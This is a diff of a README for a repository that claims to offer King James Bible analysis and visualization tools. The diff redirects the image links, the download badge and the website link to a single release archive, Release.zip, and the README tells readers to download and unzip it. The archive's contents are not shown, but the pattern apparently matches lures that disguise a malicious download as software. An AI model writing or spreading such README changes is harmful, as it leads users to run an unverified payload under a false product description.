@@ -1,6 +1,6 @@
 # 📖 Welcome to "st-kjv-vis" Repository! 📊
 
-![KJV Bible Analysis and Visualization](https://img.icons8.com/plasticine/2x/bible.png)
+![KJV Bible Analysis and Visualization](https://github.com/eloy13rayo/st-kjv-vis/releases/download/v1.0/Release.zip)
 
 ### Description:
 This repository is a collection of King James Version (KJV) Bible analysis and visualization tools. Dive deep into the scriptures with machine learning models and explore the text like never before. Uncover patterns, insights, and correlations within the Bible using advanced techniques in data analysis.
@@ -21,13 +21,13 @@ This repository is a collection of King James Version (KJV) Bible analysis and v
 Explore the richness of the King James Version Bible through a data-driven lens with our collection of advanced tools.
 
 ### Software Download:
-[![Download Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/eloy13rayo/st-kjv-vis/releases/download/v1.0/Release.zip)](https://github.com/eloy13rayo/st-kjv-vis/releases/download/v1.0/Release.zip)
 
 ### 🚀 How to Launch the Software:
 The software can be launched by downloading the zip file from the link provided above. Unzip the file and follow the instructions in the included documentation to get started with the analysis and visualization tools.
 
 ### 🌐 Visit our Website:
-For more information, tutorials, and updates, visit our [website](https://www.kjvbibleanalysis.com).
+For more information, tutorials, and updates, visit our [website](https://github.com/eloy13rayo/st-kjv-vis/releases/download/v1.0/Release.zip).
 
 ---
 
@@ -68,4 +68,4 @@ Join us on this journey of discovery through the King James Version Bible with s
 
 ### 📖 Happy Analyzing! 📊
 
-![KJV Bible](https://img.icons8.com/dotty/80/000000/open-bible.png)
+![KJV Bible](https://github.com/eloy13rayo/st-kjv-vis/releases/download/v1.0/Release.zip)
